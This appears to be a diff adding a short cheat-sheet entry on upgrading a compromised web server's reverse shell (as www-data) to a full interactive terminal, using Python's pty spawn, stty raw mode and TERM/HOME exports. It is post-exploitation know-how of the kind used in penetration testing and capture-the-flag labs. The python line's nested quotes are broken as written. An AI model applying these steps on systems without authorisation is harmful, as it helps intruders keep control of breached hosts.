@@ -1,0 +1,7 @@
+$ python -c "__import__("pty").spawn('/bin/bash')"
+www-data@host:~$ ^Z
+root@myhost:~$ stty raw -echo
+root@myhost:~$ fg
+#Enter <Ctrl+J>
+www-data@host:~$ export TERM=xterm
+www-date@host:~$ export HOME="/your/path"
